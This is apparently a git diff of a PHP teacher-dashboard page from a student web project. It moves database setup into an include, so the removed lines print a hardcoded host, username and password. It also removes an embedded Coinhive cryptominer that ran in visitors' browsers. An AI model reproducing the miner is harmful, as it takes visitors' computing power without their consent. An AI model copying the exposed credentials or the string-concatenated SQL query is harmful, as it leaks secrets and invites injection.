@@ -1,4 +1,6 @@
 <?php
+include '../utilities/database.php';
+
   session_start();
   //Check if user is logged in
   if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
@@ -14,16 +16,8 @@
     header("Location: ../login.php?event=logout");
   }
 
-  //TODO Grab all this from a file
-  //Define sql database information
-  $host="mysql.cs.iastate.edu";
-  $port=3306;
-  $socket="";
-  $user="dbu309sab3";
-  $password="SD0wFGqd";
-  $dbname="db309sab3";
-  //Connect to database
-  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());
+  //Get the db Referance
+  $db = getDB();
 
   //Get the classes that the teacher is a teacher of
   $query = "SELECT * FROM classes WHERE teacher_id = " . $_SESSION['id'];
@@ -35,17 +29,10 @@
     time goes on and I continue to learn more. -->
 <html lang="en">
   <head>
-    <link rel="stylesheet" href="../css/home.css">
+    <link rel="stylesheet" href="../css/pages.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
-    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/home.css">
-    <script>
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
-    </script>
-    <!-- End questionable content -->
 
     <!-- The top banner of the webpage -->
     <div class="top">
